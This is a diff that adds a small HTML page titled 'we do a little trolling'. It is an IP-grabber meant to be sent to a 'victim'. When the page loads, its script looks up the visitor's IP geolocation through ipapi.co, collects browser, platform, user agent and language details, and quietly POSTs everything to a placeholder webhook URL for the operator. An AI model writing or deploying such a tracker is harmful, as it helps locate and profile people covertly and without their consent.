@@ -1,0 +1,101 @@
+<!doctype html>
+<html>
+  <head>
+    <title>we do a little trolling</title>
+  </head>
+  <body onload="get()">
+
+<script>
+  function makeid(length) {
+    var result           = '';
+    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {
+      result += characters.charAt(Math.floor(Math.random() * 
+ charactersLength));
+   }
+   return result;
+}
+
+  </script>
+
+
+
+<label style="font-family:'Comic Sans MS'">This is the message the victim will see.</label>
+        
+
+
+
+  </body>
+</html>
+
+
+
+<script>
+  async function get() {
+    let url = 'https://ipapi.co/json/'
+    let obj = await (await fetch(url)).json();
+  
+    return obj;
+}
+var tags;
+(async () => {
+  tags = await get()
+
+  var browser = "Unknown"
+
+  if((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1 ) {
+        browser = 'Opera';
+    } else if(navigator.userAgent.indexOf("Chrome") != -1 ) {
+        browser = 'Chrome';
+    } else if(navigator.userAgent.indexOf("Safari") != -1) {
+        browser = 'Safari';
+    } else if(navigator.userAgent.indexOf("Firefox") != -1 ){
+        browser = 'Firefox';
+    } else if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) {
+        browser = 'IE';
+    } else {
+        browser = 'Unknown';
+    }
+
+
+ var request = new XMLHttpRequest();
+      request.open("POST", "put a webhook url here.");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+var url = window.location.href;
+var shortenedurl = url.substring(8, url.length);
+if(url.length >= 80)
+{
+
+ shortenedurl = url.substring(8, 79) + "...";
+
+}
+else
+{
+
+shortenedurl = url.substring(8, url.length);
+
+}
+
+
+      var params = {
+        username: shortenedurl,
+        content: "```" + "MAIN INFO" + "\n" + "-------------------------------" + "\n" + JSON.stringify(tags, null, "\t") + "\n" + "\n" + "DEVICE INFO" + "\n" + "-------------------------------" + "\n" + "Browser Name: " + browser + "\n" + "Platform: " + navigator.platform + "\n" + "Cookies Enabled: " + navigator.cookieEnabled + "\n" + "User Agent: " + navigator.userAgent + "\n" + "Browser Language: " + navigator.language + "```",
+      } 
+
+      request.send(JSON.stringify(params));
+
+
+})()
+  </script>
+
+
+
+    
+
+
+
+  </body>
+</html>
